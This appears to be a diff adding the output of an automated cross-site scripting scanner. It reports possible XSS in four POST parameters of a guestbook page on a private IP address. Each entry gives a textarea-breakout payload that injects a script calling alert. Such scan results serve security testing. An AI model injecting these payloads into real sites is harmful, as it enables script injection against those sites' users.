@@ -1,0 +1,16 @@
+Maybe there is a XSS in post parameter ['text', 'title', ()]
+from : http://10.206.10.113/book.php
+to : http://10.206.10.113/book.php
+Payload : </textarea><script>alert(1)</script>//
+Maybe there is a XSS in post parameter ['text', 'name', ()]
+from : http://10.206.10.113/book.php
+to : http://10.206.10.113/book.php
+Payload : </textarea><script>alert(2)</script>//
+Maybe there is a XSS in post parameter ['text', 'email', ()]
+from : http://10.206.10.113/book.php
+to : http://10.206.10.113/book.php
+Payload : </textarea><script>alert(3)</script>//
+Maybe there is a XSS in post parameter ['textarea', 'ms', ()]
+from : http://10.206.10.113/book.php
+to : http://10.206.10.113/book.php
+Payload : </textarea><script>alert(4)</script>//
